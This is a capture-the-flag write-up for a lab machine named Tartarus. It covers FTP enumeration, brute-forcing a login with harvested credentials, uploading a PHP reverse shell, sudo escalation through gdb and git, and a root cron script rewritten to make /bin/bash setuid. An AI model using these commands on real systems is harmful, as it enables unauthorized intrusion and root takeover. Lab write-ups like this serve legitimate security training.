# Tartarus

_25th August 2020_

## Host enumeration

The initial scan reports the following.

```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

### Analysis

Since HTTP is running on port 80, we can proceed to view the web page on `http://<IP>/`
The site is the default Apache page. However, robots.txt on the server shows us this.

```
User-Agent: *
Disallow : /admin-dir

I told d4rckh we should hide our things deep.
```

`http://<IP>/admin-dir/` shows us two files with some usernames and credentials.

## FTP

Since FTP is open, we can try to access it using `ftp <IP>` (Anonymous access is enabled).

### Analysis

FTP file listing shows us the following.

```
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ...
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
```

We see an interesting directory `...`. On moving to that directory and listing the files, we see another directory called `...` again. On repeating the process, we find a text file called `yougotgoodeyes.txt`. Upon downloading we find an HTTP endpoint. We can now navigate to `http://<IP>/sUp3r-s3cr3t` from the browser.

## Brute-forcing credentials

We can use the previously obtained usernames and passwords as the wordlist to bruteforce the login page. We find the credentials as `enox: P@ssword1234`.

### Analysis

Upon login, a php file upload page is found. We can try to upload a php reverse shell from [pentestmonkey].
Upon further analysis using gobuster, we find the reverse shell at the subdirectory `/images/uploads` and we can click on it while listening on our local machine using `nc -l <IP>`. As expected, we get a shell. After some poking around, we can find the user flag in `/home/d4rckh/user.txt`. On checking for rights using `sudo -l`, we find that our current user (www-data) has access to run `/var/www/gdb` as the user (thirtytwo).

## Privilege escalation

We can escalate ourselves to \* using the following from gtfobins.

```
sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit
```

### Analysis

The user is now (thirytwo) and we can find a file in `/home/thirtytwo` which contains the following.

```
Hey 32, the other day you were unable to clone my github repository.
Now you can use git. Took a while to fix it but now its good :)

~D4rckh
```

On checking for rights using `sudo -l`, we find that our current user (thirtytwo) has access to run `/usr/bin/git` as the user (d4rckh).

## Privilege escalation to (d4rckh)

We can escalate ourselves to the user (d4rckh) using the following from gtfobins.

```
sudo -u d4rckh /usr/bin/git help config
```

### Analysis

Running the command `!bash`, we get a shell as the user (d4rckh). We see a file in `/home/d4rckh/` called `cleanup.py`. Checking the crontab shows that this script is scheduled to run every two minutes as the (root) user.

## Privilege escalation to (root)

We can change `cleanup.py` to mark `/bin/bash` as a setuid binary. Since `/bin/bash` is owned by root, it will grant us access to run `/bin/bash` as a non root user on setting the uid. `cleanup.py` runs automatically and it's new contents are as follows.

```python
#!/usr/bin/env/ python
import os
import sys

try:
    os.system('chmod +s /bin/bash')
except:
    sys.exit()
```

### Analysis

After `cleanup.py` runs, we can run `/bin/bash -p` and get a shell as the (root) user. The root flag can now be read from `/home/root.txt`.
